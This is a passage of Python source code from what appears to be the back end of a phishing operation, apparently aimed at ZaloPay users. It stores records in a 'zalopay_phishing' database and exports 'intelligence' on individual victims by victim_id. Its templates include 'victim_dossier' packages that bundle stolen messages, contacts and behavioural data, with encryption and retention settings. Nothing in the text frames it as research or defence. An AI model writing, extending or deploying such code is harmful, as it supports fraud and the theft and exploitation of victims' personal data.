                "operation_type": "intelligence_gathering",
                "status": "completed",
                "intelligence_collected": len(intelligence_data.get("data_types", [])),
                "data_sources": intelligence_data.get("metadata", {}).get("data_sources", []),
                "collection_timestamp": intelligence_data.get("exported_at")
            }
            
        except Exception as e:
            logger.error(f"Error generating operation summary: {e}")
            return {}
    
    async def _add_export_metadata(self, export_record: Dict[str, Any]):
        """Add export metadata tracking"""
        try:
            metadata = {
                "export_id": export_record["export_id"],
                "victim_id": export_record["victim_id"],
                "export_format": export_record["export_format"],
                "package_type": export_record.get("package_type"),
                "size": export_record.get("size", 0),
                "encryption_applied": export_record.get("encryption_applied", False),
                "compression_applied": export_record.get("compression_applied", False),
                "exported_at": export_record["completed_at"],
                "metadata_hash": hashlib.sha256(json.dumps(export_record).encode()).hexdigest()
            }
            
            # Store metadata in tracking
            self.export_tracking[export_record["export_id"]]["metadata"] = metadata
            
        except Exception as e:
            logger.error(f"Error adding export metadata: {e}")
    
    async def _store_export_record(self, export_record: Dict[str, Any]):
        """Store export record in database"""
        try:
            if not self.mongodb:
                return
            
            db = self.mongodb.get_database("zalopay_phishing")
            exports_collection = db.intelligence_exports
            
            # Create document
            document = {
                "export_id": export_record["export_id"],
                "victim_id": export_record["victim_id"],
                "export_format": export_record["export_format"],
                "package_type": export_record.get("package_type"),
                "status": export_record["status"],
                "size": export_record.get("size", 0),
                "encryption_applied": export_record.get("encryption_applied", False),
                "compression_applied": export_record.get("compression_applied", False),
                "started_at": export_record["started_at"],
                "completed_at": export_record["completed_at"],
                "options": export_record.get("options", {}),
                "metadata": export_record.get("metadata", {}),
                "expires_at": datetime.now(timezone.utc) + timedelta(days=self.config["default_retention_days"])
            }
            
            exports_collection.replace_one(
                {"export_id": export_record["export_id"]},
                document,
                upsert=True
            )
            
        except Exception as e:
            logger.error(f"Error storing export record: {e}")
    
    def _load_export_templates(self) -> Dict[str, Dict[str, Any]]:
        """Load export templates"""
        return {
            "intelligence_report": {
                "sections": ["executive_summary", "intelligence_analysis", "contact_network", "recommendations"],
                "format_options": ["pdf", "json", "excel"],
                "encryption_required": True
            },
            "victim_dossier": {
                "sections": ["victim_profile", "intelligence_summary", "communication_patterns"],
                "format_options": ["pdf", "json"],
                "encryption_required": True
            },
            "operational_report": {
                "sections": ["operation_summary", "intelligence_gathered", "recommendations"],
                "format_options": ["pdf", "json", "excel"],
                "encryption_required": False
            }
        }
    
    def _load_package_templates(self) -> Dict[str, Dict[str, Any]]:
        """Load package templates"""
        return {
            "standard": {
                "include_types": ["messages", "contacts", "intelligence"],
                "compression": True,
                "encryption": False
            },
            "secure": {
                "include_types": ["messages", "contacts", "intelligence", "validation"],
                "compression": True,
                "encryption": True
            },
            "comprehensive": {
                "include_types": ["messages", "contacts", "intelligence", "validation", "behavioral", "campaign"],
                "compression": True,
                "encryption": True
            }
        }
    
    def get_export_stats(self) -> Dict[str, Any]:
        """Get export statistics"""
        try:
            return {
                "active_exports": len(self.export_tracking),
                "configuration": self.config,
                "export_templates": list(self.export_templates.keys()),
                "package_templates": list(self.package_templates.keys()),
                "supported_formats": [format.value for format in ExportFormat],
                "supported_package_types": [package_type.value for package_type in PackageType],
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error getting export stats: {e}")
            return {"error": str(e)}

# Global data export system instance
data_export_system = None

def initialize_data_export_system(mongodb_connection=None, redis_client=None) -> DataExportSystem:
    """Initialize global data export system"""
    global data_export_system
    data_export_system = DataExportSystem(mongodb_connection, redis_client)
    return data_export_system

def get_data_export_system() -> DataExportSystem:
    """Get global data export system"""
    if data_export_system is None:
        raise ValueError("Data export system not initialized")
    return data_export_system

# Convenience functions
def export_intelligence_data(victim_id: str, export_format: ExportFormat, package_type: PackageType = None, export_options: Dict[str, Any] = None) -> Dict[str, Any]:
    """Export intelligence data (global convenience function)"""
    return get_data_export_system().export_intelligence_data(victim_id, export_format, package_type, export_options)
